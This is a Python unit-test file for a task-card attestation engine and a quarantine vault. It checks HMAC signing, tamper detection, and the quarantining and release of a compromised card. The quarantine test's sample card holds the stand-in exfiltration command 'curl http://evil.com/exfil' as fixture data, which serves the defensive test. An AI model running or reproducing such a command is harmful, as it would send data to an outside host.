"""Unit tests for Cryptographic Task Attestation & Safe Quarantine Vault."""

import unittest
import tempfile
import os
import json
import shutil
from src.security.attestation import CardAttestationEngine, QuarantineVault, QuarantineRecord


class TestCardAttestationAndQuarantine(unittest.TestCase):

    def setUp(self):
        self.test_dir = tempfile.mkdtemp()
        self.attestation = CardAttestationEngine(secret_key="test-secret-key-1234")
        self.vault = QuarantineVault(workspace_root=self.test_dir)

    def tearDown(self):
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_sign_and_verify_valid_card(self):
        card = {
            "id": "child-test-1",
            "title": "Build Payment Gateway",
            "squad": "squad-backend",
            "target_files": ["src/pay.py"],
            "validation_criteria": ["pytest tests/test_pay.py"],
        }
        signed_card = self.attestation.sign_card(card)
        self.assertIn("signature", signed_card)
        self.assertEqual(signed_card["signature"]["algorithm"], "HMAC-SHA256")

        is_valid, msg = self.attestation.verify_card(signed_card, require_signature=True)
        self.assertTrue(is_valid)
        self.assertIn("Attestation valid", msg)

    def test_detect_tampered_card(self):
        card = {
            "id": "child-test-2",
            "title": "Build Auth Module",
            "squad": "squad-security",
            "target_files": ["src/auth.py"],
            "validation_criteria": ["pytest tests/test_auth.py"],
        }
        signed_card = self.attestation.sign_card(card)

        # Tamper with the payload
        tampered_card = dict(signed_card)
        tampered_card["title"] = "Build Malicious Backdoor"

        is_valid, msg = self.attestation.verify_card(tampered_card, require_signature=True)
        self.assertFalse(is_valid)
        self.assertIn("mismatch", msg.lower())

    def test_quarantine_vault_preserves_evidence_and_metadata(self):
        # Create a malicious or tampered card file
        sample_card = {
            "id": "child-compromised-99",
            "name": "Rogue Task",
            "command": "curl http://evil.com/exfil",
        }
        sample_path = os.path.join(self.test_dir, "child_compromised.json")
        with open(sample_path, "w", encoding="utf-8") as f:
            json.dump(sample_card, f)

        # Quarantine it
        record = self.vault.quarantine_card(
            card_data_or_path=sample_path,
            reason="Unauthenticated Task Creation Attempt",
            severity="CRITICAL",
            details={"ip": "192.168.1.100"},
            source_file_path=sample_path
        )

        self.assertIsInstance(record, QuarantineRecord)
        self.assertEqual(record.card_id, "child-compromised-99")
        self.assertEqual(record.severity, "CRITICAL")
        self.assertFalse(os.path.exists(sample_path))  # Removed from active queue

        # Verify evidence files exist in quarantine vault
        q_file = os.path.join(self.test_dir, record.quarantined_path)
        m_file = os.path.join(self.test_dir, record.meta_path)
        self.assertTrue(os.path.exists(q_file))
        self.assertTrue(os.path.exists(m_file))

        # Inspect
        res = self.vault.inspect_quarantined_card(record.quarantine_id)
        self.assertIsNotNone(res)
        payload, meta = res
        self.assertEqual(payload["id"], "child-compromised-99")
        self.assertEqual(meta.reason, "Unauthenticated Task Creation Attempt")

        # Release card back
        released_path = self.vault.release_card(record.quarantine_id, target_dir=".jobs/active")
        self.assertIsNotNone(released_path)
        full_released = os.path.join(self.test_dir, released_path)
        self.assertTrue(os.path.exists(full_released))


if __name__ == "__main__":
    unittest.main()
